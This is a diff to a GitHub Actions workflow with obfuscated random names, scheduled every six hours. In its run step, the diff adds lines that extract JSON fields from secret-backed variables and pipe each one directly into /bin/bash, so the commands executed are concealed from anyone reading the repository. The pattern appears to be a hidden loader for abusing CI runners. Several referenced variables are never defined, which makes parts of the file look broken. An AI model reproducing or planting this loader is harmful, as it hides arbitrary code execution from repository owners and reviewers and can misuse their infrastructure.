@@ -1,8 +1,10 @@
 name: xiaxijie6537
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '20 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +13,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiaxijie6537
         env:
-          pctf697: ${{ secrets.pctf697 }}
+          b0394: ${{ secrets.b0394 }}
         run: |
-          echo $pctf697 | jq -r .z569 | /bin/bash
-          echo $zukj0 | jq -r .z36 | /bin/bash
-          echo $nnivc508 | jq -r .scj8 | /bin/bash
-          echo $s30 | jq -r .n671 | /bin/bash
+          echo $b0394 | jq -r .unj46698 | /bin/bash
+          echo $yit71801 | jq -r .dnfx73 | /bin/bash
+          echo $er70 | jq -r .sqqtm7179 | /bin/bash
+          echo $e8879 | jq -r .xcml6 | /bin/bash
+          echo $cgz168 | jq -r .vd0662 | /bin/bash
+          echo $mnxo36 | jq -r .fv7010 | /bin/bash
 
